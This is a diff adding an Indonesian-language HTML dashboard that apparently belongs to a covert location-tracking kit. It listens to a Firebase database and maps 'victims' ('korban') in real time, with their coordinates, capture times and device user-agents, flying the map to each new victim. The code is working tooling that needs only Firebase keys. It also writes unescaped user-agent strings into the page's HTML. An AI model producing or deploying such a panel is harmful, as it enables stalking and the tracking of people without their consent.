@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📍 Live Tracker Dashboard</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1a1a1a; color: white; }
+        #map { height: 100vh; width: 100%; z-index: 1; }
+        
+        .info-panel {
+            position: absolute; top: 10px; right: 10px; z-index: 1000;
+            background: #242424; color: white; padding: 15px; border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5); width: 300px; max-height: 90vh; overflow-y: auto;
+            border: 1px solid #333;
+        }
+        h3 { margin: 0 0 15px 0; font-size: 18px; border-bottom: 1px solid #444; padding-bottom: 10px; }
+        
+        .log-item { 
+            background: #333; margin-bottom: 8px; padding: 10px; border-radius: 6px; 
+            cursor: pointer; transition: 0.2s; border-left: 3px solid #1877f2;
+        }
+        .log-item:hover { background: #444; transform: translateX(5px); }
+        .log-coord { font-weight: bold; font-size: 14px; color: #42b72a; }
+        .log-meta { font-size: 11px; color: #aaa; margin-top: 4px; word-break: break-all; }
+        
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); } 100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); } }
+    </style>
+</head>
+<body>
+
+<div id="map"></div>
+<div class="info-panel">
+    <h3>👥 Lokasi Korban</h3>
+    <div id="logsList">Menunggu data...</div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+    // --- GANTI CONFIG INI DENGAN DARI FIREBASE KAMU (SAME AS INDEX.HTML) ---
+    const firebaseConfig = {
+        apiKey: "MASUKIN_API_KEY_KAMU",
+        authDomain: "PROJECT_ID.firebaseapp.com",
+        databaseURL: "https://PROJECT_ID-default-rtdb.firebaseio.com",
+        projectId: "PROJECT_ID",
+        storageBucket: "PROJECT_ID.appspot.com",
+        messagingSenderId: "SENDER_ID",
+        appId: "APP_ID"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Setup Map
+    var map = L.map('map', {zoomControl: false}).setView([-6.2088, 106.8456], 13);
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+        attribution: '&copy; OpenStreetMap &copy; CARTO'
+    }).addTo(map);
+    L.control.zoom({position: 'bottomleft'}).addTo(map);
+
+    var markers = {};
+    var popupOpen = null;
+
+    // Realtime Listener
+    const locationsRef = ref(db, 'locations');
+    onValue(locationsRef, (snapshot) => {
+        const data = snapshot.val();
+        const listDiv = document.getElementById('logsList');
+        listDiv.innerHTML = ""; 
+
+        if (!data) {
+            listDiv.innerHTML = '<div style="padding:10px; color:#888;">Belum ada korban.</div>';
+            return;
+        }
+
+        Object.keys(data).forEach((key) => {
+            const log = data[key];
+            
+            // Marker Logic
+            if (!markers[key]) {
+                const marker = L.marker([log.lat, log.lng]).addTo(map);
+                
+                // Popup Content
+                const dateObj = new Date(log.time);
+                const timeStr = dateObj.toLocaleString('id-ID');
+                const uaShort = log.userAgent.split(' ')[0] || 'Unknown Device';
+                
+                marker.bindPopup(`
+                    <b>Korban Baru!</b><br>
+                    Waktu: ${timeStr}<br>
+                    HP: ${uaShort}<br>
+                    <a href="https://www.google.com/maps?q=${log.lat},${log.lng}" target="_blank">Buka di Maps</a>
+                `);
+                
+                marker.on('popupopen', () => { popupOpen = key; });
+                marker.on('popupclose', () => { popupOpen = null; });
+
+                marker.setIcon(L.divIcon({
+                    className: 'custom-marker',
+                    html: '<div style="background-color:#1877f2; width:15px; height:15px; border-radius:50%; border:2px solid white; box-shadow:0 0 10px #1877f2;"></div>',
+                    iconSize: [20, 20]
+                }));
+                
+                markers[key] = marker;
+                
+                // Zoom to new victim
+                map.flyTo([log.lat, log.lng], 16, {duration: 2});
+            }
+
+            // List Logic
+            const item = document.createElement('div');
+            item.className = 'log-item';
+            const dateObj = new Date(log.time);
+            const timeStr = dateObj.toLocaleTimeString('id-ID');
+            
+            item.innerHTML = `
+                <div class="log-coord">Lat: ${log.lat.toFixed(4)}, Lon: ${log.lng.toFixed(4)}</div>
+                <div class="log-meta">🕒 ${timeStr} | 📱 ${log.userAgent?.split(' ')[0] || 'Mobile'}</div>
+            `;
+            
+            item.onclick = () => {
+                map.flyTo([log.lat, log.lng], 17);
+                markers[key].openPopup();
+            };
+            listDiv.appendChild(item);
+        });
+    });
+</script>
+
+</body>
+</html>
